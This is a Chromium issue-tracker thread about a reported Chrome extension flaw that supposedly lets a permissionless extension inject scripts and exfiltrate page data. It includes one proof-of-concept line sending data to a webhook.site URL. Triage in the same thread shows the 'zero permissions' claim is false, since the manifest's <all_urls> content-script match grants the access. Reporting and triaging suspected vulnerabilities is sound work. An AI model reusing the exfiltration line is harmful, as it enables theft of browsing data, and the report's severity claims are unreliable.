@@ -1,0 +1,233 @@
+Issue ID: 443752808
+
+Author: pe...@gmail.com
+<h1>Chrome Extension API Vulnerability Report</h1>
+<p><strong>Chrome Version:</strong> 139.0.7258.155 (Official Build) (64-bit)<br>
+<strong>OS:</strong> Windows 11 Pro, 24H2<br>
+<strong>Lacros Version:</strong> <em>(not applicable or not provided)</em><br>
+<strong>Severity:</strong> Critical<br>
+<strong>Reported by:</strong> Pedro Correia</p>
+<hr>
+<h2>Executive Summary</h2>
+<p>A Chrome extension with <strong>no declared permissions</strong> is able to <strong>inject and execute code within the context of a webpage</strong>, <strong>access the DOM</strong>, and <strong>exfiltrate sensitive data</strong> — all <strong>without user interaction</strong>. This constitutes a <strong>zero-click vulnerability</strong> that violates Chrome&#39;s extension security model and poses a significant risk to user privacy and data integrity.</p>
+<hr>
+<h2>Expected Behavior</h2>
+<p>Extensions that declare <strong>no permissions</strong> in their manifest should <strong>not</strong> be able to:</p>
+<ul>
+<li>Inject scripts into webpages.</li>
+<li>Communicate with the main window.</li>
+<li>Access or manipulate the DOM.</li>
+<li>Exfiltrate data from the page context.</li>
+</ul>
+<hr>
+<h2>Actual Behavior</h2>
+<p>Despite declaring no permissions, the extension:</p>
+<ul>
+<li>Automatically triggers a chain of execution when the popup opens.</li>
+<li>Injects code into the webpage and gains access to the DOM.</li>
+<li>Reads sensitive data from the page and sends it back to the popup.</li>
+<li>Exfiltrates the data by embedding it in the query parameters of an image URL, which is then sent to an attacker-controlled server.</li>
+</ul>
+<p>This entire process occurs <strong>without any user interaction</strong>.</p>
+<hr>
+<h2>Steps to Reproduce</h2>
+<ol>
+<li>Unzip the provided <code>.zip</code> file (contains the vulnerable extension).</li>
+<li>Load the unpacked extension in Chrome via <code>chrome://extensions</code>.</li>
+<li>Open any webpage (target page).</li>
+<li>Trigger the extension popup (or let it open automatically).</li>
+<li>Observe:
+<ul>
+<li>Code injection into the webpage.</li>
+<li>DOM access and data extraction.</li>
+<li>Creation of an image element with sensitive data in the URL.</li>
+</ul>
+</li>
+</ol>
+<hr>
+<h2>Technical Summary</h2>
+<ul>
+<li><strong>Trigger:</strong> Automatic popup execution.</li>
+<li><strong>Vector:</strong> Popup script injects code into the main page.</li>
+<li><strong>Payload:</strong> Extracted data is sent via image URL query parameters.</li>
+<li><strong>Permissions:</strong> None declared in <code>manifest.json</code>.</li>
+<li><strong>Exploit Type:</strong> Zero-click, DOM access, data exfiltration.</li>
+</ul>
+<hr>
+<h2>Impact Assessment</h2>
+<ul>
+<li><strong>Privacy Violation:</strong> Sensitive user data can be silently stolen.</li>
+<li><strong>Security Breach:</strong> Bypasses Chrome’s extension permission model.</li>
+<li><strong>Zero-Click Exploit:</strong> No user interaction required.</li>
+<li><strong>Potential Abuse:</strong> Could be used for phishing, session hijacking, or surveillance.</li>
+</ul>
+<hr>
+<h2>Recommendations</h2>
+<ul>
+<li>Review and patch the extension API to prevent popup-based DOM access without permissions.</li>
+<li>Enforce stricter isolation between extension popups and webpage contexts.</li>
+<li>Audit other extensions for similar abuse patterns.</li>
+<li>Improve documentation and developer guidance on popup behavior and security boundaries.</li>
+<li>Prevent contentScripts with manifest &quot;world&quot;: &quot;main&quot; from communicating indirectly with the extension.</li>
+</ul>
+<hr>
+<h2>Additional Notes</h2>
+<p><strong>Note:</strong> Chrome is not responsible for bugs or behavior of individual extensions. However, this vulnerability highlights a <strong>systemic issue</strong> in how popup execution flows can be abused even without declared permissions.</p>
+
+Author: pe...@gmail.com
+public_non_google
+
+Author: pe...@gmail.com
+Unauthorized Code Injection and Data Exfiltration via Chrome Extension Popup [ZERO CLICKS, ZERO PERMISSIONS NEEDED]
+
+Author: pe...@gmail.com
+type.googleapis.com/google.devtools.issuetracker.v1.User
+
+Author: se...@chromium.org
+type.googleapis.com/google.devtools.issuetracker.v1.User
+
+Author: se...@chromium.org
+public_non_google
+
+Author: pe...@google.com
+type.googleapis.com/google.devtools.issuetracker.v1.CustomFieldValue
+
+Author: pe...@google.com
+google_domain
+
+Author: ch...@google.com
+type.googleapis.com/google.protobuf.Int64Value
+
+Author: ch...@google.com
+google_domain
+
+Author: th...@chromium.org
+[security shepherd]<br>Hi reporter, please:<br>1. Attach the individual files instead of a zip file, and<br>2. Attach a POC video demonstrating the behavior you are observing.<br><br>I am also going to proactively link this FAQ entry: <a href="https://chromium.googlesource.com/chromium/src/+/HEAD/docs/security/faq.md#should-i-ask-an-ai-to-generate-a-vulnerability-report-for-chrome" target="_blank" rel="noopener noreferrer nofollow ugc" data-b-widget="url" data-b-original-href="https://chromium.googlesource.com/chromium/src/+/HEAD/docs/security/faq.md#should-i-ask-an-ai-to-generate-a-vulnerability-report-for-chrome" data-b-redirected-href="https://chromium.googlesource.com/chromium/src/+/HEAD/docs/security/faq.md#should-i-ask-an-ai-to-generate-a-vulnerability-report-for-chrome">https://chromium.googlesource.com/chromium/src/+/HEAD/docs/security/faq.md#should-i-ask-an-ai-to-generate-a-vulnerability-report-for-chrome</a>. Please ensure that you have validated that the report has found an issue that is actually present in Chrome.<br><br>I am setting a NextAction date of tomorrow. If there is no response with the information requested above within 24 hours, this bug should be closed. (You can file a new report with the needed information if there is a valid bug that you need more time for.)
+
+Author: th...@chromium.org
+public_non_google
+
+Author: th...@chromium.org
+type.googleapis.com/google.protobuf.Int64Value
+
+Author: th...@chromium.org
+type.googleapis.com/google.devtools.issuetracker.v1.CustomFieldValue
+
+Author: pe...@gmail.com
+<p>Hi,</p>
+<p>Thank you for your response.</p>
+<p>Here are the individual files as requested. These files must be placed into the correct Chrome Extension folder structure to reproduce the vulnerability. The structure is as follows:</p>
+<p>Chrome Vuln Report/</p>
+<p>├── action/</p>
+<p>│   ├── main.html</p>
+<p>│   └── script.js</p>
+<p>├── background/</p>
+<p>│   └── service-worker.js</p>
+<p>├── contentScripts/</p>
+<p>│   ├── intermediary.js</p>
+<p>│   └── main.js</p>
+<p>├── images/</p>
+<p>│   └── finger2.png</p>
+<p>└── manifest.json</p>
+<p>Note: In script.js, on line 24, you may change the webhook URL to one that you control in order to receive the exfiltrated data.
+The line is:
+img.src = &#39;<a href="https://webhook.site/c0ee8ec5-e182-4251-931c-850148e81a15?data=" data-b-widget="url" data-b-original-href="https://webhook.site/c0ee8ec5-e182-4251-931c-850148e81a15?data=" data-b-redirected-href="https://www.google.com/url?q=https://webhook.site/c0ee8ec5-e182-4251-931c-850148e81a15?data%3D&amp;sa=D&amp;source=buganizer&amp;usg=AOvVaw2NUB23k2gE8T6H9WJYH2IA">https://webhook.site/c0ee8ec5-e182-4251-931c-850148e81a15?data=</a>&#39; + data;</p>
+<p>This proof-of-concept demonstrates how a Chrome extension without any declared permissions can still execute code within the context of a webpage and extract sensitive data directly from the DOM. The exploit is triggered automatically when the popup opens, making this a zero-click vulnerability.</p>
+<p>I am currently preparing a video demonstration of the exploit and will attach it shortly.</p>
+<p>Please let me know if you need the files in a different format or if further clarification is required.</p>
+<p>Best regards,
+Pedro Correia</p>
+
+Author: pe...@gmail.com
+TkRRek56VXlPREE0TFRZNU1USTRNVFl5TFMwMk5UY3dNRFl6TURnPQ==
+
+Author: pe...@gmail.com
+TkRRek56VXlPREE0TFRZNU1USTRNVFl6TFMwMU1qZ3hNVGc1TVRZPQ==
+
+Author: pe...@gmail.com
+TkRRek56VXlPREE0TFRZNU1USTJPRGsxTFRFNE56a3pOakU0TlRFPQ==
+
+Author: pe...@gmail.com
+TkRRek56VXlPREE0TFRZNU1USTRNVFkwTFRZeE1EQTNORFl3
+
+Author: pe...@gmail.com
+TkRRek56VXlPREE0TFRZNU1USTBNell5TFRNNE1UUTBORFl6TWc9PQ==
+
+Author: pe...@gmail.com
+TkRRek56VXlPREE0TFRZNU1USTJPRGsyTFRFMU5EQTBNVGsxTURJPQ==
+
+Author: pe...@gmail.com
+TkRRek56VXlPREE0TFRZNU1USTRNVFkxTFRFM05qVTFOamcyTVRrPQ==
+
+Author: pe...@google.com
+<p>Thank you for providing more feedback. Adding the requester to the CC list.</p>
+
+Author: th...@chromium.org
+type.googleapis.com/google.devtools.issuetracker.v1.User
+
+Author: pe...@google.com
+type.googleapis.com/google.protobuf.Int64Value
+
+Author: pe...@gmail.com
+<p>Hi,</p>
+<p>While I was recording the video, I had to fix a few issues in my proof of concept. I also have a medical appointment, so I’ll be away for a short while.</p>
+<p>I will send you the video and the final version of the code in a few hours.</p>
+<p>Thanks,
+Pedro Correia</p>
+
+Author: pe...@gmail.com
+Hi,<br><br>I’m back with the updated code and the proof-of-concept videos.<br><br>Please follow the same folder structure instructions as before to reproduce the vulnerability. Let me know if the video can be improved or if any changes to the code would help clarify the issue. I believe there is potential to extend the exploit chain further, and I am currently exploring ways to bypass additional security features.<br><br>Looking forward to your feedback.<br><br>Best regards,  <br>Pedro Correia
+
+Author: pe...@gmail.com
+TkRRek56VXlPREE0TFRZNU1USTBNelk0TFRNM056a3pNVGN3
+
+Author: pe...@gmail.com
+TkRRek56VXlPREE0TFRZNU1UUTFPVFV6TFRVeE16UTJPRFE0Tmc9PQ==
+
+Author: pe...@gmail.com
+TkRRek56VXlPREE0TFRZNU1USTJPRGs0TFRjM056VTVPREEyT1E9PQ==
+
+Author: pe...@gmail.com
+TkRRek56VXlPREE0TFRZNU1USTBNelk1TFRFd01USXlPRGt6TnpJPQ==
+
+Author: pe...@gmail.com
+TkRRek56VXlPREE0TFRZNU1UUTFPVFUwTFRFNE5EZzBOemszTnprPQ==
+
+Author: pe...@gmail.com
+TkRRek56VXlPREE0TFRZNU1USTJPRGs1TFRFM09EQTJOVGM0TlRFPQ==
+
+Author: pe...@gmail.com
+TkRRek56VXlPREE0TFRZNU1UUTRORE16TFRJd01ESTFNamc1TmpRPQ==
+
+Author: pe...@gmail.com
+TkRRek56VXlPREE0TFRZNU1UUTFPVFUxTFRFNU1UTTBPVGt3TVRVPQ==
+
+Author: pe...@gmail.com
+TkRRek56VXlPREE0TFRZNU1UUTFPVFUyTFMweU1UTTBPREkzTmpNNA==
+
+Author: th...@chromium.org
+Thanks for the video and the individual files. Your manifest.json file is granting permission to do this via content_scripts.matches = [&quot;&lt;all_urls&gt;&quot;] so this is working as expected. You can learn more at <a href="https://www.google.com/url?q=https://developer.chrome.com/docs/extensions/develop/concepts/declare-permissions&amp;sa=D&amp;source=buganizer&amp;usg=AOvVaw2cZHad4VoU5H9uwbvENmxL" target="_blank" rel="noopener noreferrer nofollow ugc" data-b-widget="url" data-b-original-href="https://developer.chrome.com/docs/extensions/develop/concepts/declare-permissions" data-b-redirected-href="https://www.google.com/url?q=https://developer.chrome.com/docs/extensions/develop/concepts/declare-permissions&amp;sa=D&amp;source=buganizer&amp;usg=AOvVaw2cZHad4VoU5H9uwbvENmxL">https://developer.chrome.com/docs/extensions/develop/concepts/declare-permissions</a>. <br><br>I&#39;m closing this bug out since this is working as intended.
+
+Author: th...@chromium.org
+type.googleapis.com/google.protobuf.Int32Value
+
+Author: pe...@google.com
+<p>The NextAction date has arrived: 2025-09-09
+To opt-out from this automation rule, please add Optout-Blintz-Nextaction-Alert to the &quot;Chromium Labels&quot; custom field.</p>
+
+Author: pe...@gmail.com
+<p>Hi,</p>
+<p>Thanks for the clarification.</p>
+<p>I hadn’t considered that using &quot;matches&quot; in content_scripts acts as a formal permission. That makes sense now.</p>
+<p>Even so, this shows how a threat actor could exploit users using an extension that technically follows Chrome’s API model. The fact that it works without explicit permissions makes it more concerning.</p>
+<p>Is there any warning shown to users during installation about the risks of data exfiltration or code injection when using broad match patterns?</p>
+<p>I also confirmed the exploit doesn’t work when &quot;matches&quot; is restricted to specific domains, or when only using a popup and background script without content_scripts.</p>
+<p>I plan to continue exploring this chain to see if it can bypass other security features.</p>
+<p>Best regards,<br>
+Pedro Correia</p>
+
+Author: ch...@google.com
+<p>This bug has been closed for more than 14 weeks. Removing issue access restrictions.</p>
+
+Author: ch...@google.com
+type.googleapis.com/google.devtools.issuetracker.v1.IssueAccessLimit
